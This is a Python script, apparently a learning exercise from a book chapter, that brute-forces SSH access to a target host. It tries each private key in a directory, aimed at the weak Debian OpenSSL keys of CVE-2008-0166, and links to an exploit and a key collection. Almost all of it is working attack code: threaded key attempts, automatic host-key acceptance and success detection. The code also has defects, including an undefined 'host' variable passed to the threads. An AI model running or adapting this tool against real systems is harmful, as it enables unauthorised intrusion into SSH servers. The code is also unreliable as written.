# SSH brute force with pxssh class and keyfile, based on chapter 2
# Python 3.4

"""

 Another example of this script: https://www.exploit-db.com/exploits/5720/
 The 32768 keys can be found here: https://github.com/g0tmi1k/debian-ssh
 The exploit CVE: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166

 For this works, you must have a Debian distro with an vulnerable version of Openssl.
 I've tested it with version 0.9.8g
 Download links:
    1 Ubuntu pkg- https://launchpad.net/ubuntu/+source/openssl/0.9.8b-2ubuntu2.1
    2 Source - https://www.openssl.org/source/old/0.9.x/openssl-0.9.8b.tar.gz

"""

import pexpect
import argparse
import os
import threading

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0


def connect(user, host, keyfile, release):

    global Stop
    global Fails

    try:

        # Defines what pexpect should expect as return.
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'

        # SSH connection with keyfile instead of password. If no keyfile is sent, there will be no connection.
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i' + keyfile + opt

        # Starts a connections and reads the return.
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied,ssh_newkey, conn_closed, '$', '#'])


        if ret == 2:
            print("[-] Adding host to know_host file")
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print("[-] {0}.".format(conn_closed))
            Fails += 1
        elif ret > 3:
            print("[+] Success. {0}".format(str(keyfile)))
            Stop = True

    finally:

        # After succeed on trying connection, releases the lock from resource.
        if release:
            connection_lock.release()

def main():

    # Defines the options and the help menu.
    parser = argparse.ArgumentParser(description="Simple Python SSH Brute Force with keyfile")
    parser.add_argument('Target', help="Target host.")
    parser.add_argument('User', help="User for ssh connection.")
    parser.add_argument('KeyDir', help="Directory with private keyfiles for connection.")

    # Receives the arguments sent by the user.
    args = parser.parse_args()
    tgtHost = args.Target
    user = args.User
    keyDir = args.KeyDir

    # If anything is not set , prints the help menu from argparse and exits.
    if tgtHost == None or user == None or keyDir == None:
        print(parser.usage)
        exit(0)

    for keyfile in os.listdir(keyDir):

        if Stop:
            print("[*] Key found. Exiting.")
            exit(0)

        if Fails > 5:
            print("[!] Too many connection errors. Exiting.")
            exit(0)

        connection_lock.acquire()

        # Receives the keyfile's location and joins it with the file name for a complete path.
        fullpath = os.path.join(keyDir, keyfile)
        print("[-] Testing key: {0}".format(str(fullpath)))

        # Defines and starts the thread.
        bruteforce = threading.Thread(target=connect, args=(user, host, fullpath, True))
        child = bruteforce.start()

if __name__ == '__main__':
    main()